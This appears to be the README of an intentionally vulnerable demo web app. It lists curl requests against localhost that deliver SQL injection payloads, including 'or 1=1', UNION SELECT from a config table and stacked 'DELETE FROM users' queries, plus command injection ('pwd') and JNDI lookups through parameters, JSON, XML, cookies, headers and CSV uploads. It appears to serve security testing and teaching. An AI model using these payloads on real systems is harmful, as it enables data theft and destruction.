# Vulnerable

## SQL Injection

### GET request - payload in query param
```bash
curl --get --data-urlencode "name=michal" http://localhost:8080/vun/sql/example1/1/
curl --get --data-urlencode "name=michal' or 1=1 -- -" http://localhost:8080/vun/sql/example1/1/
curl --get --data-urlencode "name=michal' UNION SELECT * FROM config -- -" http://localhost:8080/vun/sql/example1/1/
curl --get --data-urlencode "name=michal\' or 1=1-- -" http://localhost:8080/vun/sql/example1/1/
curl --get --data-urlencode "name=michal\'/**/or/**/1=1/**/-- -" http://localhost:8080/vun/sql/example1/1/
```

### POST request - payload in json body
```bash
curl -X POST http://localhost:8080/vun/sql/example2/ -H "Content-Type: application/json" -d "{\"filter\": \"michal\"}"  
curl -X POST http://localhost:8080/vun/sql/example2/ -H "Content-Type: application/json" -d "{\"filter\": \"michal' or 1=1 -- -\"}"  
```

### POST request - payload in json body
```bash
curl -X POST http://localhost:8080/vun/sql/example3/ -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker\"}"  
curl -X POST http://localhost:8080/vun/sql/example3/ -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker'); SELECT * FROM users; -- - \"}"  
curl -X POST http://localhost:8080/vun/sql/example3/ -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker'); DELETE FROM users; -- - \"}"  
```

### GET request - payload in cookie
```bash
curl http://localhost:8080/vun/sql/example4/ --cookie "name=michal"
curl http://localhost:8080/vun/sql/example4/ --cookie "name=michal'%20or%201=1%20--%20-"
```

### GET request - payload in header
```bash
curl http://localhost:8080/vun/sql/example5/1/ -H "X-Filter:michal"
curl http://localhost:8080/vun/sql/example5/1/ -H "X-Filter:michal' or 1=1 -- -"
```

### POST request - payload in xml body
```bash
curl -X POST http://localhost:8080/vun/sql/example6/ -H "Content-Type: application/xml" -d "<filters><filter>michal</filter></filters>"  
curl -X POST http://localhost:8080/vun/sql/example6/ -H "Content-Type: application/xml" -d "<filters><filter>michal' or 1=1 -- -</filter></filters>"
```

### POST request - payload in csv file
```bash
echo "\"name\",\"surname\"" > /tmp/file.csv
echo "\"michal\",\"hacker'); DELETE FROM users; -- -\"" >> /tmp/file.csv
curl  -X POST -H "Content-Type: multipart/form-data" http://localhost:8080/vun/sql/example7/1/ --form file="@/tmp/file.csv"
```

## CMD Injection

### GET request - payload in query param
```bash
curl http://localhost:8080/vun/cmd/example1/?cmd=pwd
```

### POST request - payload in json body
```bash
curl -X POST http://localhost:8080/vun/cmd/example2/ -H "Content-Type: application/json" -d "{\"filter\": \"pwd\"}"  
```

### POST request - payload in xml body
```bash
curl -X POST http://localhost:8080/vun/cmd/example3/ -H "Content-Type: application/xml" -d "<filters><filter>pwd</filter></filters>"  
```

### GET request - payload in cookie
```bash
curl http://localhost:8080/vun/cmd/example4/ --cookie "cmd=pwd"
```

### GET request - payload in header
```bash
curl http://localhost:8080/vun/cmd/example5/ -H "X-Filter:pwd"
```

### POST request - payload in csv file
```bash
echo "\"name\",\"surname\"" > /tmp/file2.csv
echo "\"michal\",\"pwd\"" >> /tmp/file2.csv
curl  -X POST -H "Content-Type: multipart/form-data" http://localhost:8080/vun/cmd/example6/ --form file="@/tmp/file2.csv"
```

## JNDI Injection

### GET request - payload in query param
```bash
curl http://localhost:8080/vun/jndi/example1/?payload=java%3Acomp%2Fenv%2Fjdbc%2Fdatasource
```